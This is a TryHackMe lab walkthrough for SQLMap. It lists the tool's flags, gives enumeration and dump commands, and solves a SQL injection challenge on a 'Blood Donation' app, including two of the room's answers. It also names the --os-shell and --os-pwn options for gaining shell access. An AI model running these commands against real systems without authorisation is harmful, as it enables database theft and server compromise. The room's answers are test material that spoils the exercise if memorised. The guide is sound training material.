# TryHackMe Room: SQLMAP

===========================================
## Task 1: Introduction
===========================================
SQLMap is a powerful open-source tool used to automate the detection and exploitation of SQL injection vulnerabilities.

Key Features:
- Detects and exploits SQLi automatically
- Supports multiple DBMS (MySQL, PostgreSQL, Oracle, etc.)
- Can enumerate DBs, tables, columns, users, passwords
- Offers advanced features like OS command execution, file reading/writing, and even shell access

Command-line tool written in Python.
Pre-installed on Kali Linux or can be downloaded from GitHub.

===========================================
## Task 2: Using SQLMap
===========================================

-- Basic Syntax --
sqlmap -u "http://example.com/page.php?id=1" --dbs

Common Flags:
- -u            : Target URL
- --data        : POST data string (e.g., "id=1")
- -p            : Specify parameter to test (e.g., -p id)
- --dbs         : List all databases
- --tables      : List tables in a specific DB
- --columns     : List columns in a table
- --dump        : Dump data from a table
- --batch       : Run in non-interactive mode
- --random-agent : Use random User-Agent
- --flush-session: Clear previous sessions

-- Enumeration Examples --

1. List databases:
sqlmap -u "http://example.com/page.php?id=1" --dbs

2. Select database and list tables:
sqlmap -u "http://example.com/page.php?id=1" -D users --tables

3. Get columns from a table:
sqlmap -u "http://example.com/page.php?id=1" -D users -T accounts --columns

4. Dump data:
sqlmap -u "http://example.com/page.php?id=1" -D users -T accounts --dump

-- POST Request Example using request file --

1. Save intercepted request to req.txt
2. sqlmap -r req.txt -p blood_group --dbs

Other useful options:
--banner             : Get DBMS banner
--current-user       : DBMS current user
--current-db         : Current database
--os-shell           : Try to open OS shell
--os-pwn             : Meterpreter shell/VNC access (advanced)

===========================================
## Task 3: SQLMap Challenge Walkthrough
===========================================

## Target: Blood Donation web app (deploy via TryHackMe)

Step-by-step:

1. Intercept a POST request with the blood_group parameter.
2. Save it as `req.txt`
3. Run SQLMap:

> sqlmap -r req.txt -p blood_group --dbs  
  --> Finds database: blood

4. Enumerate tables:
> sqlmap -r req.txt -D blood --tables  
  --> Tables found: blood_db, flag, users

5. Get columns of blood_db:
> sqlmap -r req.txt -D blood -T blood_db --columns

6. Dump data:
> sqlmap -r req.txt -D blood --dump-all

Find answers to:

Q1: What is the name of the interesting directory?
A1: /blood

Q2: What is the current database user?
A2: root@localhost

Q3: Submit the final flag
A3: try it :)

===========================================
## Summary Cheatsheet
===========================================

- -u URL                      → Target URL
- --data "param=val"         → POST data
- -p param                   → Test specific parameter
- --dbs                      → List databases
- -D dbname --tables         → List tables in db
- -T table --columns         → List columns
- --dump                     → Dump table data
- --batch                    → Non-interactive mode
- -r req.txt                 → Use saved HTTP request
- --current-user             → Show DB user
- --os-shell                 → Try OS shell (if injectable)

===========================================
### Tips
===========================================

- Always use --batch in CTFs to speed things up.
- Combine -D, -T, and -C to target specific data.
- sqlmap saves output logs by default in /root/.sqlmap/output/
- Use --flush-session if you change payloads and want a clean slate.
